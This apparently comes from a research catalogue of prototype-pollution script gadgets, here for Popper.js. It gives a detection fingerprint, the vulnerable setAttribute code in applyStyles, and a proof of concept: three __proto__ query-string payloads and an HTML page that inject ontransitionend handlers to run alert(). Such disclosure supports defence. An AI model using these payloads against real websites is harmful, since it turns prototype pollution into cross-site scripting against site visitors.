## Popper.js

URL: https://popper.js.org/

### JS Fingerprint
```
(typeof Popper !== 'undefined')
```

### Vulnerable code fragment
https://github.com/popperjs/popper-core/blob/4800b37c5b4cabb711ac1d904664a70271487c4b/src/modifiers/applyStyles.js#L11-L31
```js
    const attributes = state.attributes[name] || {};
    ...
    Object.keys(attributes).forEach((name) => {
      const value = attributes[name];
      ...
        element.setAttribute(name, value === true ? '' : value);
```

### PoC

```
?__proto__[arrow][style]=color:red;transition:all%201s&__proto__[arrow][ontransitionend]=alert(1)
?__proto__[reference][style]=color:red;transition:all%201s&__proto__[reference][ontransitionend]=alert(2)
?__proto__[popper][style]=color:red;transition:all%201s&__proto__[popper][ontransitionend]=alert(3)
```

```html
<button id="button" aria-describedby="tooltip">Button</button>
<div id="tooltip" role="tooltip">Tooltip<div data-popper-arrow></div></div>

<script src="https://unpkg.com/@popperjs/core@2"></script>
<script>
	Object.prototype.arrow={"style":"color:red;transition:all 1s","ontransitionend":"alert(1)"}
	Object.prototype.reference={"style":"color:red;transition:all 1s","ontransitionend":"alert(2)"}
	Object.prototype.popper={"style":"color:red;transition:all 1s","ontransitionend":"alert(3)"}
</script>
<script>
  const button = document.querySelector('#button');
  const tooltip = document.querySelector('#tooltip');
  const popperInstance = Popper.createPopper(button, tooltip);
</script>
```